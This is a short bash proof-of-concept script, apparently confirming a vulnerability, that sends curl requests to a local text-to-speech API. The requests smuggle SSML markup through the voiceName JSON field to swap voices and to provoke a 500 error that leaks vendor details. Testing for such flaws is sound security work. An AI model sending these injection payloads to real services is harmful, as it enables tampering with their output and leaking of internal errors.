#!/usr/bin/env bash
# Confirmed 2026-05-28
set -eu
echo "--- 1) SSML voice-swap injection (succeeds, returns WAV) ---"
curl -sS -X POST http://localhost:3001/api/tts \
  -H 'Content-Type: application/json' \
  -d '{"text":"hello","voiceName":"x\"></voice><voice name=\"en-US-JennyNeural"}' \
  --max-time 5 -o /tmp/inject.wav -w "code:%{http_code} size:%{size_download} ct:%{content_type}\n"
file /tmp/inject.wav

echo "--- 2) SSML prosody injection (HTTP 500, vendor error leak) ---"
curl -sS -X POST http://localhost:3001/api/tts \
  -H 'Content-Type: application/json' \
  -d '{"text":"hi","voiceName":"en-US-AriaNeural\"/><prosody rate=\"slow\"/><voice name=\"en-US-JennyNeural"}' \
  --max-time 5
